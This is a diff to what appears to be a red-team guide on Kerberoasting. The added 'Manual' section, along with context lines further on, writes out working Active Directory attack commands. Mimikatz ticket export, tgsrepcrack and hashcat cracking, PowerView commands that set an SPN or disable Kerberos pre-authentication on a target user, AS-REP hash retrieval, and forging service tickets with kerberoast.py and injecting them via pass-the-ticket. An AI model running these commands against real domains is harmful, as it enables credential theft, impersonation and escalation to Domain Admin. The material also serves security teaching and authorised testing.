@@ -11,8 +11,6 @@ Red Teams usually attempt to crack tickets which have higher possibility to be c
 * Password expiration
 * Last logon
 
-
-
 Specifically the Kerberoast attack involves five steps:
 
 1. SPN Discovery
@@ -68,6 +66,48 @@ Service Principal Names can be also discovered from non-joined domain systems wi
 ```
 
 ![](<../../../.gitbook/assets/image (182).png>)
+
+### Manual
+
+```
+# Request TGS for kerberoastable account (SPN)
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"
+
+# Dump TGS to disk
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+# Crack with TGSRepCrack
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
+```
+
+**Targeted kerberoasting by setting SPN -**  We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:
+
+```
+Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}
+```
+
+### AS-REP roasting <a href="#as-rep-roasting" id="as-rep-roasting"></a>
+
+Get the hash for a roastable user (see above for hunting). Using `ASREPRoast.ps1`:
+
+```
+Get-ASREPHash -UserName TargetUser
+```
+
+Crack the hash with Hashcat:
+
+```
+hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
+```
+
+**Targeted AS-REP roasting by disabling Kerberos pre-authentication -** Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:
+
+```
+Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}
+```
+
+
 
 ## Request Service Tickets
 
@@ -152,10 +192,6 @@ kiwi_cmd kerberos::list
 
 {% embed url="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1" %}
 
-
-
-
-
 ## Cracking The Hash
 
 ### Hashcat
@@ -188,7 +224,7 @@ Add user to another group (in this case Domain Admin)
 
 ## Rewrite Service Tickets & RAM Injection
 
-Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to  rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow to impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins.
+Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow to impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins.
 
 ```
 python kerberoast.py -p Password123 -r megabank_001.kirbi -w megabank.kirbi -u 500
@@ -210,4 +246,3 @@ kerberos::ptt PENTESTLAB.kirbi
 {% embed url="https://github.com/nidem/kerberoast" %}
 
 {% embed url="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" %}
-
